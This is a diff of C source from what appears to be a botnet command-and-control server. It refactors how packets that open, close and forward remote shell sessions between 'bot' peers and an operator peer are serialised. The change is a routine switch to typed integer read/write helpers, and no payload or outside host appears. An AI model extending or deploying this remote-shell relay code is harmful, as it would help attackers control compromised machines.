@@ -88,15 +88,15 @@ struct sLaika_shellInfo *laikaC_openShell(struct sLaika_peer *bot, struct sLaika
 
     /* send SHELL_OPEN packets */
     laikaS_startOutPacket(bot, LAIKAPKT_SHELL_OPEN);
-    laikaS_writeInt(&bot->sock, &shell->botShellID, sizeof(uint32_t));
-    laikaS_writeInt(&bot->sock, &cols, sizeof(uint16_t));
-    laikaS_writeInt(&bot->sock, &rows, sizeof(uint16_t));
+    laikaS_writeu32(&bot->sock, shell->botShellID);
+    laikaS_writeu16(&bot->sock, cols);
+    laikaS_writeu16(&bot->sock, rows);
     laikaS_endOutPacket(bot);
 
     laikaS_startOutPacket(auth, LAIKAPKT_SHELL_OPEN);
-    laikaS_writeInt(&auth->sock, &shell->authShellID, sizeof(uint32_t));
-    laikaS_writeInt(&auth->sock, &cols, sizeof(uint16_t));
-    laikaS_writeInt(&auth->sock, &rows, sizeof(uint16_t));
+    laikaS_writeu32(&auth->sock, shell->authShellID);
+    laikaS_writeu16(&auth->sock, cols);
+    laikaS_writeu16(&auth->sock, rows);
     laikaS_endOutPacket(auth);
 
     return shell;
@@ -106,11 +106,11 @@ void laikaC_closeShell(struct sLaika_shellInfo *shell)
 {
     /* send SHELL_CLOSE packets */
     laikaS_startOutPacket(shell->bot, LAIKAPKT_SHELL_CLOSE);
-    laikaS_writeInt(&shell->bot->sock, &shell->botShellID, sizeof(uint32_t));
+    laikaS_writeu32(&shell->bot->sock, shell->botShellID);
     laikaS_endOutPacket(shell->bot);
 
     laikaS_startOutPacket(shell->auth, LAIKAPKT_SHELL_CLOSE);
-    laikaS_writeInt(&shell->auth->sock, &shell->authShellID, sizeof(uint32_t));
+    laikaS_writeu32(&shell->auth->sock, shell->authShellID);
     laikaS_endOutPacket(shell->auth);
 
     /* unlink */
@@ -175,7 +175,7 @@ void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     struct sLaika_shellInfo *shell;
     uint32_t id;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&peer->sock);
 
     /* ignore packet if shell isn't open */
     if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
@@ -196,7 +196,7 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     if (sz > LAIKA_SHELL_DATA_MAX_LENGTH + sizeof(uint32_t))
         return;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&peer->sock);
 
     /* ignore packet if shell isn't open */
     if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
@@ -206,7 +206,7 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
 
     /* forward SHELL_DATA packet to auth */
     laikaS_startVarPacket(shell->auth, LAIKAPKT_SHELL_DATA);
-    laikaS_writeInt(&shell->auth->sock, &shell->authShellID, sizeof(uint32_t));
+    laikaS_writeu32(&shell->auth->sock, shell->authShellID);
     laikaS_write(&shell->auth->sock, buf, sz - sizeof(uint32_t));
     laikaS_endVarPacket(shell->auth);
 }
